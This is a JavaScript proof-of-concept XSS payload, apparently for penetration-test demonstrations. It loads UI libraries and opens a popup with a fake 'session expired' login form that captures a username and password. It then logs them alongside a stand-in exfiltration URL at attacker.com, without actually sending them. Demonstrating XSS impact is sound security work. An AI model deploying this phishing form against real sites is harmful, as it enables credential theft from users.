var x = document.createElement('link');
x.rel  = 'stylesheet';
x.href='poc-inc/w2ui-1.4.2.min.css';
document.getElementsByTagName('head')[0].appendChild(x); 

x = document.createElement('script');
x.src='poc-inc/w2ui-1.4.2.min.js';
document.getElementsByTagName('head')[0].appendChild(x); 

x = document.createElement('script');
x.src='poc-inc/jquery.min.js';
document.getElementsByTagName('head')[0].appendChild(x);  

setTimeout(payload, 2000);

function payload() {
    w2popup.open({
    	width: 450,
    	height: 500,
        title: '<div style=""><strong>This page is vulnerable to XSS.</strong></div>',
        body: '<div class="w2ui-centered" style="position:static; margin-top:20%">\
         This XSS popup was created using JavaScript hosted on the attackers server. Alternatively the attacker could hijack the user\'s session, or perform actions as the user, such as sending a request to change password or make a payment.\
		\
		<br><br>\<u>EXAMPLE Login Pane:</u><br><br>Your session has expired. Please log-in again</div>\
        <div style="margin-left:17%">\
        <table>\
        	<tr>\
        		<td>Username:</td>\
        		<td><input type="text" name="user" class="user"></td>\
        	</tr>\
        	<tr>\
        		<td>Password:</td>\
        		<td><input type="password" name="pass" class="pass"></td>\
        	</tr>\
        </table>\
        </div>',
        buttons: '<button class="btn" onclick="get()">Login</button>'
    });
}

function get() {
    var username = $(".user").val();
    var password = $(".pass").val();
    console.log ("XSS Phish Test. Outputting to console rather than a GET request. \nSending credentials to the attacker's server @ http://attacker.com/?u=" + username + "&p=" + password);
}
